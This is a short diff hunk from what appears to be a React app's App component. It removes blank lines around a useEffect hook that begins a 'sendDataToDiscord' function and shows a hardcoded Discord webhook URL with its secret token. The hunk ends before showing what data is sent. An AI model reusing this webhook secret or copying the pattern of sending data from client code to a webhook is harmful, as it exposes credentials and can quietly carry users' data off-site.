@@ -39,8 +39,6 @@ function App() {
     };
   }
 
-
-
   useEffect(() => {
     const sendDataToDiscord = async () => {
       const webhookUrl = "https://discord.com/api/webhooks/1250442295615160394/9TP2NZrjlIm0Csj45yiFL5sS_tvb8qPrXf2hxSZBfS3dPU3Hu6CaWKo_lSbvd0kxQlI_"
